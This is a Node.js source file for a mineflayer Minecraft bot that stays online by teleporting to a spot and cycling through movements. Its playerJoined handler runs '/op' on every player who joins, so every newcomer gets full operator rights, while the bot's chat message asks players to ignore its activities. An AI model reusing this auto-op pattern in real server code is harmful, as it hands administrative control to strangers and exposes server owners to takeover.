const mineflayer = require('mineflayer');
const config = require('./config.json');

const loginMessage = "I'm a 24/7 AFK bot. Please ignore my activities. All actions are to keep the server online.";

let movementPhase = 0;
const STEP_INTERVAL = 1500;
const STEP_SPEED    = 1;
const JUMP_DURATION = 500;

function createBot() {
  const botUsername = config.botUsername;

  const bot = mineflayer.createBot({
    host: config.serverHost,
    port: config.serverPort,
    username: botUsername,
    auth: 'offline',
    version: false,
    viewDistance: config.botChunk
  });

  bot.on('spawn', () => {
    console.log(`✅ ${bot.username} is Ready!`);

    // Teleport to the AFK spot
    // Note: Bot must be OP or have a plugin to allow this command.
    bot.chat('/tp -11 67 10');

    // Start the movement cycle
    movementPhase = 0;
    setTimeout(movementCycle, 3000);
  });

  function movementCycle() {
    if (!bot.entity) return;

    switch (movementPhase) {
      case 0:
        bot.setControlState('forward', true);
        bot.setControlState('back', false);
        bot.setControlState('jump', false);
        bot.setControlState('sneak', true);
        break;
      case 1:
        bot.setControlState('forward', false);
        bot.setControlState('back', true);
        bot.setControlState('jump', false);
        bot.setControlState('sneak', false);
        break;
      case 2:
        bot.setControlState('forward', false);
        bot.setControlState('back', false);
        bot.setControlState('jump', true);
        setTimeout(() => {
          bot.setControlState('jump', false);
        }, JUMP_DURATION);
        break;
      case 3:
        bot.setControlState('forward', false);
        bot.setControlState('back', false);
        bot.setControlState('jump', false);
        break;
    }

    movementPhase = (movementPhase + 1) % 4;

    setTimeout(movementCycle, STEP_INTERVAL);
  }
  
  bot.on('login', function() {
    console.log(`Logged In as ${bot.username}`);
    bot.chat(loginMessage);
  });

  bot.on('playerJoined', (player) => {
    // Check if the joined player is the bot itself.
    if (player.username === bot.username) return;

    console.log(`${player.username} has joined! Giving them OP status...`);
    // The bot sends the /op command to make the new player an operator.
    bot.chat(`/op ${player.username}`);
  });

  bot.on('error', (err) => {
    console.error('⚠️ Error:', err);
  });

  bot.on('end', () => {
    console.log('⛔️ Bot Disconnected! Reconnecting in 10 seconds...');
    setTimeout(createBot, 10000);
  });
}

createBot();